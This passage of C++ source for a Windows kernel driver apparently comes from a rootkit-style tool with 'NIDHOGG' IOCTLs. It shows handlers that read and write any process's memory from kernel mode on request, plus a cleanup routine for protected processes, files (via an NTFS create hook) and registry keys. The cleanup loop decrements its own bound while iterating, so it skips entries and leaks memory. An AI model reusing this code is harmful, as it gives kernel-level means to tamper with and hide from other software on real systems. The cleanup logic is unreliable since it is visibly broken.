		auto data = (PkgReadWriteData*)Irp->AssociatedIrp.SystemBuffer;

		if (data->LocalAddress == 0 || data->RemoteAddress == 0 || data->Pid <= 0 || data->Size <= 0) {
			KdPrint((DRIVER_PREFIX "Buffer is invalid.\n"));
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		status = PsLookupProcessByProcessId((HANDLE)data->Pid, &TargetProcess);

		if (!NT_SUCCESS(status)) {
			KdPrint((DRIVER_PREFIX "Failed to get process.\n"));
			break;
		}

		status = KeWriteProcessMemory(data->LocalAddress, TargetProcess, data->RemoteAddress, data->Size, data->Mode);

		ObDereferenceObject(TargetProcess);
		len += sizeof(PkgReadWriteData);
		break;
	}

	case IOCTL_NIDHOGG_READ_DATA:
	{
		PEPROCESS Process;

		if (!Features.ReadData) {
			KdPrint((DRIVER_PREFIX "Due to previous error, read data feature is unavaliable.\n"));
			status = STATUS_UNSUCCESSFUL;
			break;
		}

		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size % sizeof(PkgReadWriteData) != 0) {
			KdPrint((DRIVER_PREFIX "Invalid buffer type.\n"));
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (PkgReadWriteData*)Irp->AssociatedIrp.SystemBuffer;

		if (data->LocalAddress == 0 || data->RemoteAddress == 0 || data->Pid <= 0 || data->Size <= 0) {
			KdPrint((DRIVER_PREFIX "Buffer is invalid.\n"));
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		status = PsLookupProcessByProcessId((HANDLE)data->Pid, &Process);

		if (!NT_SUCCESS(status)) {
			KdPrint((DRIVER_PREFIX "Failed to get process.\n"));
			break;
		}

		status = KeReadProcessMemory(Process, data->RemoteAddress, data->LocalAddress, data->Size, data->Mode);

		ObDereferenceObject(Process);
		len += sizeof(PkgReadWriteData);
		break;
	}

	default:
		status = STATUS_INVALID_DEVICE_REQUEST;
		break;
	}

	Irp->IoStatus.Status = status;
	Irp->IoStatus.Information = len;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return status;
}

/*
* Description:
* ClearAll is responsible for freeing all allocated memory and cleaning all the globals.
*
* Parameters:
* There are no parameters.
*
* Returns:
* There is no return value.
*/
void ClearAll() {
	// Clearing the process array.
	AutoLock processProtectingLocker(pGlobals.Lock);

	memset(&pGlobals.ProtectedProcesses.Processes, 0, sizeof(pGlobals.ProtectedProcesses.Processes));
	pGlobals.ProtectedProcesses.PidsCount = 0;

	// Clearing the files array.
	AutoLock filesLocker(fGlobals.Lock);

	for (int i = 0; i < fGlobals.Files.FilesCount; i++) {
		ExFreePoolWithTag(fGlobals.Files.FilesPath[i], DRIVER_TAG);
		fGlobals.Files.FilesPath[i] = nullptr;
		fGlobals.Files.FilesCount--;
	}

	if (fGlobals.Callbacks[0].Activated)
		UninstallNtfsHook(IRP_MJ_CREATE);

	// Clearing the registry keys and values.
	AutoLock registryLocker(rGlobals.Lock);

	for (int i = 0; i < rGlobals.ProtectedItems.Keys.KeysCount; i++) {
		ExFreePoolWithTag(rGlobals.ProtectedItems.Keys.KeysPath[i], DRIVER_TAG);
		rGlobals.ProtectedItems.Keys.KeysPath[i] = nullptr;
	}
	rGlobals.ProtectedItems.Keys.KeysCount = 0;

	for (int i = 0; i < rGlobals.ProtectedItems.Values.ValuesCount; i++) {
		ExFreePoolWithTag(rGlobals.ProtectedItems.Values.ValuesPath[i], DRIVER_TAG);
		ExFreePoolWithTag(rGlobals.ProtectedItems.Values.ValuesName[i], DRIVER_TAG);
		rGlobals.ProtectedItems.Values.ValuesPath[i] = nullptr;
		rGlobals.ProtectedItems.Values.ValuesName[i] = nullptr;
	}
	rGlobals.ProtectedItems.Values.ValuesCount = 0;
}
